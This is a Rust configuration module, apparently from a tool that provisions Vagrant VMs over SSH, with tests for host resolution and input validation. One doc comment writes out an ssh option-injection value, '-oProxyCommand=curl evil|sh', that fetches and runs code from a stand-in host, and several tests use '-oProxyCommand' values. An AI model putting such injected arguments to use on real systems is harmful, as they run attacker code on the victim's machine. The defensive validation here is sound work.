//! Project configuration (`bombyx.toml`).
//!
//! A bombyx project describes its VM in `bombyx.toml`, in the
//! project repo. The VM host holds nothing from that repo:
//! bombyx renders the Vagrantfile from `[vm]` and writes it
//! there on every `up`. This module reads that per-project
//! configuration.
//!
//! **The VM host is not part of it.** Which machine runs the
//! VMs is a property of the developer, not of the project --
//! each person has their own hardware on their own network --
//! so `host` comes from `--host`, the environment or a
//! per-developer file that can carry two of them, and is
//! refused in `bombyx.toml`. See [`HostSources`] for the four
//! sources and the order they are consulted in.
//!
//! Because `bombyx.toml` ships *inside a repo*, it is
//! attacker-controlled data the moment you clone or check out
//! someone else's branch. So every field is checked against an
//! explicit allowlist rather than trusted.
//!
//! Two of them are checked by their *type* and cannot be built
//! wrong at all: see [`RepoUrl`]. The rest are checked by
//! `Config::validate`, which the loading path runs. `Config`
//! has public fields, so a hand-built one skips that check.
//! That is a gap rather than a decision, argued once in
//! `docs/architecture.md` under "What config values are
//! checked". (`validate` is named rather than linked because
//! it is private, and rustdoc rejects a public page pointing
//! at a private item.)
//!
//! # Where each rule lives
//!
//! This module owns [`Config`] itself. Everything else is a
//! private child module, so rustdoc will not list them:
//!
//! - `read` -- getting a config file off disk: whether the path
//!   may be a symlink, how large a file may be, and how a TOML
//!   error is summarised.
//! - `registry` -- the operator's own `config.toml`: the VM
//!   host, and a table per project.
//! - `error` -- the two error types, and why there are two.
//! - `guards` -- the rules more than one field shares.
//! - `host` -- where the VM host name comes from, and its shape.
//! - `root` -- every rule `remote_root` must pass.
//! - `source` -- the `[source]` table and its two checked types.
//! - `vm` -- the `[vm]` table.
//!
//! A new field rule belongs in the module that owns the field.
//! Put it in `guards` only once a second field needs it.
//!
//! # Two loaders
//!
//! [`Config::load`] reads a `bombyx.toml` from the project's
//! own directory. [`Config::load_project`] takes a project name
//! instead and reads everything out of the operator's
//! `config.toml`, which is where this is going: the project
//! directory is what `docs/trust-boundary.md` says bombyx must
//! not open. Nothing calls the second one yet.
//! `project-selection-flag` in `docs/todo.md` is the step that
//! switches the binary over and deletes the first.

use std::path::Path;

use serde::Deserialize;

use crate::name::{ScratchName, check_segment};

mod error;
mod guards;
mod host;
mod read;
mod registry;
mod root;
mod source;
mod vm;

/// The `[vm]` and `[source]` tables every project file needs.
///
/// Every test that needs them reads this one constant. Writing
/// the eleven lines out per test module would mean editing each
/// module to add a required field, and a module somebody missed
/// would fail in a test about something else entirely.
#[cfg(test)]
const REQUIRED_TABLES: &str = "\n[vm]\n\
     provider = \"libvirt\"\n\
     box = \"generic/ubuntu2204\"\n\
     cpus = 2\n\
     memory = 2048\n\
     \n\
     [source]\n\
     repo = \"https://example.invalid/myproject.git\"\n\
     ref = \"main\"\n\
     script = \"vagrant/provision.sh\"\n";

/// One `[projects.<name>]` table, for a test.
///
/// `project_host` is the entry's own `host`, and `None` writes
/// an entry with no `host` line, which is what most entries look
/// like.
///
/// The `[vm]` and `[source]` tables come from
/// [`REQUIRED_TABLES`], renamed into the project's namespace,
/// because a `[projects.<name>]` table without them does not
/// parse. Renaming rather than writing them out again means a
/// field added to [`Vm`] or [`Source`] does not break a test
/// about something else.
#[cfg(test)]
fn test_entry(name: &str, project_host: Option<&str>) -> String {
    let tables = REQUIRED_TABLES
        .replace("[vm]", &format!("[projects.{name}.vm]"))
        .replace("[source]", &format!("[projects.{name}.source]"));
    let entry_host =
        project_host.map_or_else(String::new, |h| format!("host = {h:?}\n"));
    format!("[projects.{name}]\n{entry_host}{tables}")
}

/// A registry naming one project, for a test.
///
/// `host` is the file-wide one. A test needing a second project
/// appends another [`test_entry`], which is why the file-wide
/// key is written here and not there: a file may carry only one.
#[cfg(test)]
fn test_registry(name: &str, host: &str, project_host: Option<&str>) -> String {
    format!("host = {host:?}\n\n{}", test_entry(name, project_host))
}

pub use error::{ConfigError, FieldError};
pub use host::{
    CONFIG_DIR_ENV, HOST_ENV, HostOrigin, HostSources, user_config_dir,
};
pub(crate) use host::{
    HostProblem, host_problem, is_anchored_dir, registry_path, registry_place,
    resolve_host,
};
pub use registry::{Project, Registry, USER_CONFIG_FILE};
pub use source::{RepoUrl, ScriptPath, Source};
pub use vm::{Provider, Vm};

use read::{MAX_CONFIG_BYTES, Symlinks, from_toml, read_optional};
pub(crate) use root::path_segments;

/// Default root on the VM host under which project
/// directories are created.
const DEFAULT_REMOTE_ROOT: &str = "~/vms";

/// A resolved bombyx configuration.
///
/// The project fields come from `bombyx.toml`; `host` does not
/// (see [`HostSources`]).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Config {
    /// SSH host alias of the VM host, e.g. `vmhost`.
    ///
    /// Resolved through the user's `~/.ssh/config`, so
    /// bombyx never deals with addresses or usernames.
    ///
    /// **Never read from `bombyx.toml`.** The VM host is a
    /// property of the person driving bombyx, not of the
    /// project: everyone on a team has their own machine on
    /// their own network, and a committed file can name only
    /// one of them -- pointing everyone else's `destroy` at a
    /// colleague's host.
    pub host: String,

    /// Project name. Doubles as the directory name on the
    /// VM host.
    pub project: String,

    /// Root directory on the VM host under which project
    /// directories are created.
    pub remote_root: String,

    /// The machine to build. Rendered into the Vagrantfile
    /// bombyx writes on the VM host.
    pub vm: Vm,

    /// Where the guest clones the project from.
    pub source: Source,
}

/// The committed project file, exactly as it parses.
///
/// Separate from [`Config`] because the two differ: this is
/// what `bombyx.toml` may contain, and `Config` is what bombyx
/// runs with after a host has been found elsewhere.
///
/// `host` appears here only so it can be *rejected* by name.
/// Leaving it out would make `deny_unknown_fields` report
/// "unknown field `host`", which reads as a typo rather than as
/// a field that deliberately moved.
#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
struct ProjectFile {
    host: Option<String>,

    project: String,

    #[serde(default = "default_remote_root")]
    remote_root: String,

    vm: Vm,

    source: Source,
}

fn default_remote_root() -> String {
    DEFAULT_REMOTE_ROOT.to_owned()
}

impl ProjectFile {
    /// Assembles a [`Config`], with `host` supplied separately.
    ///
    /// `host` comes from elsewhere because `bombyx.toml` is
    /// forbidden to carry one: that file travels inside a
    /// repository bombyx does not trust, and the value reaches
    /// `ssh` as a bare argument. [`Config::load`] ranks it
    /// across four sources.
    fn into_config(self, host: String) -> Config {
        Config {
            host,
            project: self.project,
            remote_root: self.remote_root,
            vm: self.vm,
            source: self.source,
        }
    }
}

/// Refuses a project file carrying a `host` key.
///
/// Ignoring it with a warning was the alternative, and it is
/// worse: the key stays committed in the repo, the warning gets
/// tuned out, and the next reader cannot tell whether the value
/// is in force. An error is read once and fixed once.
fn reject_host_key(
    file: &ProjectFile,
    path: &Path,
    sources: &HostSources,
) -> Result<(), ConfigError> {
    if file.host.is_none() {
        return Ok(());
    }
    Err(ConfigError::HostInProjectFile {
        path: path.to_path_buf(),
        place: registry_place(sources),
    })
}

/// Refuses the host the ranking picked, if it is unusable.
///
/// The rule itself is `host_problem`'s, and this only decides
/// how to report a value that breaks it: by naming the *source*
/// rather than the field, because `host` can arrive from four
/// places and "which key do I edit?" has four answers.
///
/// Called by both loaders, so a bad `--host` produces the same
/// message whichever one ran. It is called while the winning
/// source is still known, which is why it takes an `origin`
/// rather than being folded into [`Config::validate`]: that
/// function sees only the assembled value and would name the
/// field.
fn check_winning_host(
    host: &str,
    origin: &HostOrigin,
    sources: &HostSources,
) -> Result<(), ConfigError> {
    let Some(problem) = host_problem(host) else {
        return Ok(());
    };
    Err(ConfigError::InvalidHost {
        // `describe` holds the wording for every source. The
        // path is passed because an operator sent to fix the
        // value has to find the file; `--host` and the variable
        // ignore it and name themselves.
        origin: origin.describe(registry_path(sources).as_deref()),
        reason: match problem {
            HostProblem::Empty => "must not be empty".to_owned(),
            HostProblem::Invalid(reason) => reason,
        },
    })
}

impl Config {
    /// Loads a project out of a registry given as a string.
    ///
    /// [`Config::load_project`] without the file: `source` is a
    /// whole `config.toml`, and `path` is only what an error
    /// message names. `HostSources::default()` supplies neither
    /// flag nor variable, so the host comes from `source` itself
    /// -- either the named project's `host` or the file-wide one.
    ///
    /// **Test-only.** Production code calls
    /// [`Config::load_project`].
    ///
    /// # Errors
    ///
    /// Every error [`Config::load_project`] lists except the
    /// ones about reading a file.
    #[cfg(test)]
    pub(crate) fn parse(
        source: &str,
        path: &Path,
        name: &str,
    ) -> Result<Self, ConfigError> {
        let registry = registry::parse(source, path)?;
        Self::from_registry(&registry, name, &HostSources::default())
            .map(|(cfg, _origin)| cfg)
    }

    /// The config every module's tests use.
    ///
    /// It lives next to the type it builds, so every test module
    /// shares one copy. Written out per module, adding a required
    /// field would mean the same edit in each of them, and the
    /// two literals would be pinned in as many places.
    ///
    /// It comes out of a registry rather than a `bombyx.toml`
    /// because the project file is on its way out: `Config::load`
    /// and everything it reads are deleted by
    /// `project-selection-flag` in `docs/todo.md`, and a shared
    /// helper built on them would have to be rewritten in that
    /// step rather than left alone.
    #[cfg(test)]
    #[must_use]
    pub(crate) fn for_tests() -> Self {
        Self::parse(
            &test_registry("myproject", "vmhost", None),
            Path::new(USER_CONFIG_FILE),
            "myproject",
        )
        .expect("the shared test config must be valid")
    }

    /// Loads a configuration: the project file, and a VM host
    /// ranked across `sources` and the per-developer file.
    ///
    /// **This reads up to two paths.** After `path`, and only
    /// when neither `sources.flag` nor `sources.env` names a
    /// host, the per-developer file in `sources.user_config_dir`
    /// is read for one. That file existing but failing to read
    /// or parse is an error rather than a silent fallback.
    ///
    /// Reading it last is what makes `--host` work on a machine
    /// whose per-developer file is missing or broken.
    ///
    /// Every setting other than the host comes from `path`
    /// alone. Validation therefore runs on the project file's
    /// own values, with the winning host already in place so it
    /// is checked too.
    ///
    /// Returns the winning [`HostOrigin`] alongside the config,
    /// so a caller reporting which host is in force does not
    /// re-derive the precedence rule.
    ///
    /// # Errors
    ///
    /// Returns [`ConfigError::NotFound`] if `path` is absent,
    /// [`ConfigError::Read`] if a file cannot be read,
    /// [`ConfigError::NotAFile`] or [`ConfigError::TooLarge`]
    /// if one is not a plain file of sensible size,
    /// [`ConfigError::Parse`] if one is not valid TOML,
    /// [`ConfigError::HostInProjectFile`] if the project file
    /// carries a `host` key, [`ConfigError::HostMissing`] if no
    /// source names a host, and [`ConfigError::Empty`] /
    /// [`ConfigError::Invalid`] if a field fails validation.
    /// The path carried by an error may be an optional file's
    /// rather than `path`.
    pub fn load(
        path: &Path,
        sources: &HostSources,
    ) -> Result<(Self, HostOrigin), ConfigError> {
        // Absence is the one io error that means something
        // different for the two files, so it is mapped here
        // rather than inside the shared reader.
        let source = read_optional(path, Symlinks::Refuse)?
            .ok_or_else(|| ConfigError::NotFound(path.to_path_buf()))?;

        let file: ProjectFile = from_toml(&source, path)?;
        reject_host_key(&file, path, sources)?;

        let (host, origin) = resolve_host(sources)?;

        // Checked while the winning source is still known, so
        // the message identifies the file (or flag) actually
        // carrying the bad value rather than the project file.
        check_winning_host(&host, &origin, sources)?;

        let cfg = file.into_config(host);
        cfg.validate()?;
        Ok((cfg, origin))
    }

    /// Loads the settings for one project out of the registry.
    ///
    /// The registry counterpart of [`Config::load`], and the
    /// loader that survives: `load` reads a `bombyx.toml` from
    /// the project's own directory, which is the dependency
    /// `docs/trust-boundary.md` exists to remove.
    ///
    /// **One file, read once.** Everything comes out of the
    /// registry: the `[projects.<name>]` table supplies every
    /// setting but the host, and the host is ranked across
    /// `--host`, `BOMBYX_HOST`, that same table's optional
    /// `host` and the file-wide one. `config::host::rank` holds
    /// the ranking and is handed the copy already read, so a
    /// file edited mid-run cannot supply a project host and a
    /// file-wide host that never coexisted.
    ///
    /// The host is ranked for `name`, whatever `sources.project`
    /// says. Ranking for one project while loading another would
    /// boot this project's VM on that one's machine, and
    /// `destroy` would `rm -rf` there.
    ///
    /// Returns the winning [`HostOrigin`] alongside the config,
    /// so a caller reporting which host is in force does not
    /// re-derive the precedence rule.
    ///
    /// # Errors
    ///
    /// Returns [`ConfigError::RegistryNotFound`] if there is no
    /// registry file, [`ConfigError::ProjectNotFound`] if it has
    /// no table for `name`, [`ConfigError::Read`],
    /// [`ConfigError::NotAFile`], [`ConfigError::TooLarge`] or
    /// [`ConfigError::Parse`] if the file cannot be read or
    /// understood, [`ConfigError::HostMissing`] if no source
    /// names a host, [`ConfigError::InvalidHost`] if the winning
    /// source names an unusable one, and
    /// [`ConfigError::Empty`] / [`ConfigError::Invalid`] if a
    /// field fails validation.
    pub fn load_project(
        name: &str,
        sources: &HostSources,
    ) -> Result<(Self, HostOrigin), ConfigError> {
        let missing = || ConfigError::RegistryNotFound {
            name: name.to_owned(),
            place: registry_place(sources),
        };
        let dir = sources.user_config_dir.ok_or_else(missing)?;
        let registry = Registry::read(dir)?.ok_or_else(missing)?;
        Self::from_registry(&registry, name, sources)
    }

    /// [`Config::load_project`] against a registry already read.
    ///
    /// Split out so nothing has to write a file to test the
    /// assembly: the test-only `Config::parse` parses a string
    /// literal and calls this. (Named rather than linked: it is
    /// `#[cfg(test)]`, so the doc build has no page for it.)
    ///
    /// # Errors
    ///
    /// Every error [`Config::load_project`] lists except the
    /// ones about reading the file.
    fn from_registry(
        registry: &Registry,
        name: &str,
        sources: &HostSources,
    ) -> Result<(Self, HostOrigin), ConfigError> {
        // First, so a broken entry is reported even when the run
        // would have taken its host from `--host` and never
        // looked in the file.
        let project = registry.project(name)?;

        // The caller's `project` is overwritten rather than
        // read, so the host and the settings always come out of
        // one entry. `Config::load_project` says what ranking
        // for one project while loading another would cost.
        let sources = HostSources {
            project: Some(name),
            ..sources.clone()
        };

        let (host, origin) = host::rank(&sources, Some(registry))?;
        check_winning_host(&host, &origin, &sources)?;

        let cfg = project.to_config(name, host);

        // `Project::validate` has already run every rule these
        // fields carry, and this runs them again over the
        // assembled value. That is deliberate: `validate` is
        // what every path building a `Config` calls, so a field
        // added to `Config` without a matching entry check is
        // still refused here.
        cfg.validate()?;
        Ok((cfg, origin))
    }

    /// Rejects values that are empty or outside their allowed
    /// shape.
    ///
    /// The `host` rules matter most. `host` is passed as the
    /// first positional argument to `ssh`, which does not
    /// honour a `--` end-of-options separator. A value starting
    /// with `-` is therefore read as an *option*, so
    /// `-oProxyCommand=curl evil|sh` runs code on this
    /// workstation from a bare `bombyx status`, before any
    /// network traffic.
    ///
    /// A cloned repo cannot supply that value, because `host` is
    /// refused in `bombyx.toml` (see
    /// [`ConfigError::HostInProjectFile`]). The check covers the
    /// four sources that can: `--host`, [`HOST_ENV`], and two
    /// keys in a per-developer `config.toml` -- one project's
    /// own `host`, and the file-wide one. A mistake or a
    /// careless script fills any of those in. The other fields
    /// *are* repo-supplied, so their rules carry the full
    /// weight.
    fn validate(&self) -> Result<(), ConfigError> {
        // The host rule lives in `host_problem`, so this and the
        // source-naming check in `load` cannot disagree.
        match host_problem(&self.host) {
            Some(HostProblem::Empty) => {
                return Err(ConfigError::Empty { field: "host" });
            }
            Some(HostProblem::Invalid(reason)) => {
                return Err(ConfigError::Invalid {
                    field: "host",
                    reason,
                });
            }
            None => {}
        }

        // Each field specifies the program it will reach.
        //
        // `project` is checked here; `remote_root` gets the same
        // two rules inside `root::check` below, along with its
        // own four.
        //
        // **For both the rule is a precaution, not a live hole.**
        // Only `host` is handed to a program as a bare argument
        // that a leading `-` could turn into an option. `project`
        // and `remote_root` go through `quote_remote_path` into a
        // shell script that `ssh` runs, so they arrive quoted.
        // The rule is kept anyway, because each of those
        // protections lives in a different file from the value,
        // and either could be rewritten by somebody who does not
        // know it is what makes the value safe.
        guards::check_not_empty("project", &self.project)?;
        guards::check_not_an_option("project", &self.project, "ssh")?;
        guards::check_not_empty("remote_root", &self.remote_root)?;

        // `project` becomes one directory name on the host.
        check_segment(&self.project).map_err(|e| ConfigError::Invalid {
            field: "project",
            reason: e.to_string(),
        })?;

        // Every `remote_root` rule lives in `config::root`,
        // because bombyx deletes the directory it derives from
        // that value. See the module for what each rule stops.
        root::check(&self.remote_root)?;

        self.validate_generated()
    }

    /// Runs the `[vm]` and `[source]` checks that types cannot.
    ///
    /// Each table's rules live in the module that owns it, and
    /// this is the only place either is called from, so no
    /// caller can run one half of the checks without the other.
    ///
    /// Split out of [`Config::validate`] because that function
    /// outgrew the 100-line limit.
    fn validate_generated(&self) -> Result<(), ConfigError> {
        // The `?` widens each `FieldError` into a `ConfigError`.
        // See the `From` impl in `config::error`.
        vm::validate(&self.vm)?;
        source::validate(&self.source)?;
        Ok(())
    }

    /// Returns the project directory on the VM host, e.g.
    /// `~/vms/myproject`.
    ///
    /// A trailing slash on `remote_root` is ignored so the
    /// result never contains a doubled separator.
    #[must_use]
    pub fn remote_project_dir(&self) -> String {
        format!("{}/{}", self.root(), self.project)
    }

    /// Returns the directory on the VM host used for an
    /// ephemeral (`scratch`) VM of this project.
    ///
    /// The project name is part of the path: `scratch pr-1`
    /// in two different projects must not resolve to the same
    /// directory, or the second boot extracts one project's
    /// Vagrantfile over the other's live `.vagrant/`.
    #[must_use]
    pub fn remote_scratch_dir(&self, name: &ScratchName) -> String {
        format!("{}/scratch/{}/{name}", self.root(), self.project)
    }

    /// Returns `remote_root` without any trailing slash.
    fn root(&self) -> &str {
        self.remote_root.trim_end_matches('/')
    }
}

#[cfg(test)]
mod tests {
    use std::path::PathBuf;

    use super::host::config_dir_from;
    use super::*;

    #[test]
    fn a_parse_error_names_the_position_and_not_the_line() {
        // The disclosure this replaced: `toml`'s own `Display`
        // quotes the offending source line, and bombyx printed it
        // to stderr. `bombyx.toml` can be a symlink, so a hostile
        // repo aimed it at a private key and had a line echoed.
        // Measured against the built binary before and after.
        let key = "-----BEGIN OPENSSH PRIVATE KEY-----\n\
                   b3BlbnNzaC1rZXktdjEAAAAA\n";
        let err = parse(key).unwrap_err();
        let text = err.to_string();
        assert!(matches!(err, ConfigError::Parse { .. }), "{text}");
        // The position and the reason are what correct a malformed
        // config, and they stay.
        assert!(text.contains("line 1"), "{text}");
        assert!(text.contains("column"), "{text}");
        // None of the file's own bytes do.
        assert!(!text.contains("BEGIN"), "{text}");
        assert!(!text.contains("OPENSSH"), "{text}");
        assert!(!text.contains("b3Blb"), "{text}");
    }

    #[test]
    fn a_shape_error_still_names_the_field() {
        // An unknown key carries no span, so the summary is the
        // reason alone -- which names the key, and that is the
        // whole answer.
        let err = parse("project = \"p\"\nhsot = \"x\"\n").unwrap_err();
        let text = err.to_string();
        assert!(text.contains("hsot"), "{text}");
    }
    /// The smallest project file that validates.
    ///
    /// Not one line: `[vm]` and `[source]` are required, so the
    /// smallest valid file carries both tables.
    ///
    /// The tables come last, and every caller passes this whole
    /// rather than appending to it. A bare key appended after a
    /// table header joins that table instead of the top level,
    /// and still parses -- so a test meaning to set
    /// `remote_root` would silently set `vm.remote_root` and
    /// fail on `deny_unknown_fields` somewhere unrelated.
    fn minimal() -> String {
        format!("project = \"myproject\"\n{REQUIRED_TABLES}")
    }

    /// The required tables, for a test composing its own
    /// top-level keys. Append this *after* those keys.
    fn required_tables() -> &'static str {
        "\n[vm]\n\
         provider = \"libvirt\"\n\
         box = \"generic/ubuntu2204\"\n\
         cpus = 2\n\
         memory = 2048\n\
         \n\
         [source]\n\
         repo = \"https://example.invalid/myproject.git\"\n\
         ref = \"main\"\n\
         script = \"vagrant/provision.sh\"\n"
    }

    /// Appends the required tables when `source` lacks them.
    ///
    /// Nearly every test here varies one top-level key and
    /// cares nothing about the machine description. Making each
    /// spell out `[vm]` and `[source]` would bury the line under
    /// test in ten lines of scenery.
    ///
    /// A test *about* a missing section must not be repaired by
    /// this, so those call [`parse_project_file`] directly
    /// rather than going through the helpers below.
    fn completed(source: &str) -> String {
        // Any table header, not just `[vm]`. Sniffing for `[vm]`
        // alone meant a fixture declaring only `[source]` -- the
        // exact case a missing-`[vm]` test needs -- had a second
        // `[source]` appended and failed on a duplicate key
        // instead of on the missing table.
        if source.lines().any(|l| l.trim_start().starts_with('[')) {
            source.to_owned()
        } else {
            format!("{source}{}", required_tables())
        }
    }

    /// Parses a `bombyx.toml`, with `host` supplied separately.
    ///
    /// This is what [`Config::load`] does to the project file,
    /// minus reading it: the `ProjectFile` parse, the refusal of
    /// a `host` key, and validation over the assembled value.
    ///
    /// It lives here rather than beside `Config::load` because
    /// the whole project file goes with that function.
    /// `project-selection-flag` in `docs/todo.md` deletes
    /// `ProjectFile`, `Config::load` and every test below that
    /// calls this, so this helper is deleted with them.
    ///
    /// `HostSources::default()` supplies no per-developer
    /// directory, so a refused `host` key cannot name that file
    /// in its message. No test below asserts on that half of the
    /// wording.
    ///
    /// `source` and `host` are both `&str`, so swapping them
    /// type-checks. A `Host` newtype would stop it and is not
    /// worth its construction sites for a helper in one test
    /// module that a later step deletes.
    fn parse_project_file(
        source: &str,
        path: &Path,
        host: &str,
    ) -> Result<Config, ConfigError> {
        let file: ProjectFile = from_toml(source, path)?;
        reject_host_key(&file, path, &HostSources::default())?;
        let cfg = file.into_config(host.to_owned());
        cfg.validate()?;
        Ok(cfg)
    }

    fn parse(source: &str) -> Result<Config, ConfigError> {
        parse_project_file(
            &completed(source),
            Path::new("bombyx.toml"),
            "vmhost",
        )
    }

    /// Parses the minimal project file with an explicit host.
    ///
    /// The host does not come from the file being parsed, so a
    /// test about host values varies this argument rather than
    /// the TOML.
    fn parse_with_host(host: &str) -> Result<Config, ConfigError> {
        parse_project_file(&minimal(), Path::new("bombyx.toml"), host)
    }

    fn good() -> Config {
        parse(&minimal()).unwrap()
    }

    fn scratch(name: &str) -> ScratchName {
        ScratchName::parse(name).unwrap()
    }

    #[test]
    fn parses_minimal_config_and_applies_defaults() {
        let cfg = good();
        assert_eq!(cfg.host, "vmhost");
        assert_eq!(cfg.project, "myproject");
        assert_eq!(cfg.remote_root, "~/vms");
    }

    #[test]
    fn parses_explicit_overrides() {
        let src = "project = \"ledgerstone\"\n\
                   remote_root = \"/srv/vms\"\n";
        let cfg = parse(src).unwrap();
        assert_eq!(cfg.remote_root, "/srv/vms");
    }

    /// [`Config::load`] without the origin.
    ///
    /// Most tests are about the resulting config; the ones about
    /// provenance call `Config::load` directly and assert on the
    /// [`HostOrigin`] it returns.
    fn load(path: &Path, sources: &HostSources) -> Result<Config, ConfigError> {
        Config::load(path, sources).map(|(cfg, _origin)| cfg)
    }

    /// Writes a per-developer config naming `host`.
    fn write_user_file(dir: &Path, host: &str) {
        std::fs::write(
            dir.join(USER_CONFIG_FILE),
            format!("host = {host:?}\n"),
        )
        .unwrap();
    }

    /// Writes a per-developer config naming `host` file-wide,
    /// plus an entry for `myproject`.
    ///
    /// `project_host` is the entry's own `host`, and `None`
    /// writes an entry with no `host` line at all -- which is
    /// what most entries look like, and what the fall-back tests
    /// need.
    ///
    /// [`test_registry`] builds the text; this writes it. The
    /// text is shared with the tests that need no file, so a
    /// change to what an entry looks like lands in one place.
    fn write_user_file_with_project(
        dir: &Path,
        host: &str,
        project_host: Option<&str>,
    ) {
        std::fs::write(
            dir.join(USER_CONFIG_FILE),
            test_registry("myproject", host, project_host),
        )
        .unwrap();
    }

    /// Sources whose only entry is the per-developer directory.
    fn user_sources(dir: &Path) -> HostSources<'_> {
        HostSources {
            user_config_dir: Some(dir),
            ..HostSources::default()
        }
    }

    /// Sources naming a host on the command line.
    fn flag_sources(host: &str) -> HostSources<'_> {
        HostSources {
            flag: Some(host),
            ..HostSources::default()
        }
    }

    /// Writes the minimal project file into a fresh directory.
    fn project_dir(source: &str) -> (tempfile::TempDir, PathBuf) {
        let dir = tempfile::tempdir().unwrap();
        let base = dir.path().join("bombyx.toml");
        std::fs::write(&base, completed(source)).unwrap();
        (dir, base)
    }

    #[test]
    fn rejects_a_host_key_in_the_project_file() {
        // The design rule, asserted: the VM host belongs to the
        // developer, and this file is committed. Refused rather
        // than ignored, so a stale key cannot sit in a repo
        // aiming everyone's `destroy` at one person's machine.
        let (dir, base) = project_dir("host = \"vmhost\"\nproject = \"p\"\n");
        let err = load(&base, &user_sources(dir.path())).unwrap_err();
        assert!(matches!(err, ConfigError::HostInProjectFile { .. }));
        let text = err.to_string();
        // The message has to say where the line goes instead,
        // or it only reports a problem.
        assert!(text.contains(USER_CONFIG_FILE), "{text}");
        assert!(text.contains("committed"), "{text}");
    }

    #[test]
    fn a_host_key_is_refused_even_when_a_flag_supplies_one() {
        // Tempting to let the flag win and move on. It must not:
        // the committed key is the thing being removed, and a
        // run that succeeds is a run nobody fixes.
        let (_dir, base) = project_dir("host = \"vmhost\"\nproject = \"p\"\n");
        assert!(matches!(
            load(&base, &flag_sources("mine")).unwrap_err(),
            ConfigError::HostInProjectFile { .. }
        ));
    }

    #[test]
    fn reports_no_host_configured_when_nothing_supplies_one() {
        let (dir, base) = project_dir(&minimal());
        let err = load(&base, &user_sources(dir.path())).unwrap_err();
        assert!(matches!(err, ConfigError::HostMissing { .. }));
        // Every way out is named, since the operator has to pick
        // one and the file is not discoverable by guessing.
        let text = err.to_string();
        assert!(text.contains(USER_CONFIG_FILE), "{text}");
        assert!(text.contains("--host"), "{text}");
        assert!(text.contains(HOST_ENV), "{text}");
    }

    #[test]
    fn takes_the_host_from_the_user_config_file() {
        let (dir, base) = project_dir(&minimal());
        write_user_file(dir.path(), "my-vmhost");
        let sources = user_sources(dir.path());
        assert_eq!(load(&base, &sources).unwrap().host, "my-vmhost");
    }

    #[test]
    fn host_precedence_runs_flag_env_project_entry_user_file() {
        // All four sources present at once, then removed one at
        // a time. Testing each in isolation would pass with any
        // ordering at all.
        let (dir, base) = project_dir(&minimal());
        write_user_file_with_project(
            dir.path(),
            "from-user-file",
            Some("from-project"),
        );

        let all = HostSources {
            flag: Some("from-flag"),
            env: Some("from-env"),
            project: Some("myproject"),
            ..user_sources(dir.path())
        };
        assert_eq!(load(&base, &all).unwrap().host, "from-flag");

        let no_flag = HostSources { flag: None, ..all };
        assert_eq!(load(&base, &no_flag).unwrap().host, "from-env");

        let no_env = HostSources {
            env: None,
            ..no_flag
        };
        assert_eq!(load(&base, &no_env).unwrap().host, "from-project");

        // Naming no project drops that source and leaves the
        // file-wide host, which is what every command does until
        // `--project` exists.
        let no_project = HostSources {
            project: None,
            ..no_env
        };
        assert_eq!(load(&base, &no_project).unwrap().host, "from-user-file");
    }

    #[test]
    fn an_entry_with_no_host_of_its_own_falls_back_to_the_file() {
        // The key is optional. A project that does not name a
        // host has to reach the file-wide one rather than
        // reporting that no source names a host at all.
        let (dir, base) = project_dir(&minimal());
        write_user_file_with_project(dir.path(), "from-user-file", None);

        let sources = HostSources {
            project: Some("myproject"),
            ..user_sources(dir.path())
        };
        assert_eq!(load(&base, &sources).unwrap().host, "from-user-file");
    }

    #[test]
    fn a_project_with_no_entry_falls_back_to_the_file() {
        // Asking which host a project prefers is not asking for
        // its entry, so a name with no table is not an error
        // here. `Registry::project` is what reports that, once.
        let (dir, base) = project_dir(&minimal());
        write_user_file_with_project(
            dir.path(),
            "from-user-file",
            Some("from-project"),
        );
        let sources = HostSources {
            project: Some("nosuchproject"),
            ..user_sources(dir.path())
        };
        assert_eq!(load(&base, &sources).unwrap().host, "from-user-file");
    }

    #[test]
    fn load_reports_which_source_won() {
        // The origin is what lets a caller *say* which host is in
        // force without re-deriving the ranking. Asserted for
        // every source, since a constant would satisfy any one of
        // them.
        let (dir, base) = project_dir(&minimal());
        write_user_file(dir.path(), "from-user-file");

        let origin_of =
            |sources: &HostSources| Config::load(&base, sources).unwrap().1;

        let user = user_sources(dir.path());
        assert_eq!(origin_of(&user), HostOrigin::UserFile);

        let env = HostSources {
            env: Some("from-env"),
            ..user
        };
        assert_eq!(origin_of(&env), HostOrigin::Env);

        let flag = HostSources {
            flag: Some("from-flag"),
            ..env
        };
        assert_eq!(origin_of(&flag), HostOrigin::Flag);
    }

    #[test]
    fn load_reports_a_project_entry_as_the_source() {
        // The origin carries the project name because a
        // project's host and the file-wide host come out of the
        // same file: `config.toml` alone does not say which of
        // the two won, and `destroy` runs `rm -rf` on the
        // winner.
        let (dir, base) = project_dir(&minimal());
        write_user_file_with_project(
            dir.path(),
            "from-user-file",
            Some("from-project"),
        );
        let sources = HostSources {
            project: Some("myproject"),
            ..user_sources(dir.path())
        };
        let (cfg, origin) = Config::load(&base, &sources).unwrap();
        assert_eq!(cfg.host, "from-project");
        assert_eq!(
            origin,
            HostOrigin::ProjectEntry(
                crate::name::ProjectName::parse("myproject").unwrap()
            )
        );
        // The notice is built from `Display`, so it has to name
        // both the entry and the file the operator edits.
        let text = origin.to_string();
        assert!(text.contains("myproject"), "{text}");
        assert!(text.contains(USER_CONFIG_FILE), "{text}");
    }

    #[test]
    fn an_invalid_host_in_an_entry_names_that_entry() {
        // A bad host is reported against the source that
        // supplied it, and for this source the useful answer is
        // which table to edit, not just which file.
        let (dir, base) = project_dir(&minimal());
        write_user_file_with_project(
            dir.path(),
            "good-host",
            Some("-oProxyCommand=x"),
        );
        let sources = HostSources {
            project: Some("myproject"),
            ..user_sources(dir.path())
        };
        let err = load(&base, &sources).unwrap_err();
        let text = err.to_string();
        assert!(matches!(err, ConfigError::InvalidHost { .. }), "{text}");
        assert!(text.contains("myproject"), "{text}");
        assert!(text.contains(USER_CONFIG_FILE), "{text}");
        assert!(!text.contains("bombyx.toml"), "{text}");
    }

    #[test]
    fn an_invalid_host_names_the_source_that_supplied_it() {
        // A bad host must be reported against the source that
        // supplied it. The project file is forbidden to carry a
        // host at all, so naming it in the message sends the
        // operator to edit the one file that cannot be at fault.
        let (dir, base) = project_dir(&minimal());
        write_user_file(dir.path(), "-oProxyCommand=x");
        let err = load(&base, &user_sources(dir.path())).unwrap_err();
        let text = err.to_string();
        assert!(matches!(err, ConfigError::InvalidHost { .. }), "{text}");
        assert!(text.contains(USER_CONFIG_FILE), "{text}");
        assert!(!text.contains("bombyx.toml"), "{text}");

        // And the flag names itself rather than a file.
        let err = load(&base, &flag_sources("-oProxyCommand=x")).unwrap_err();
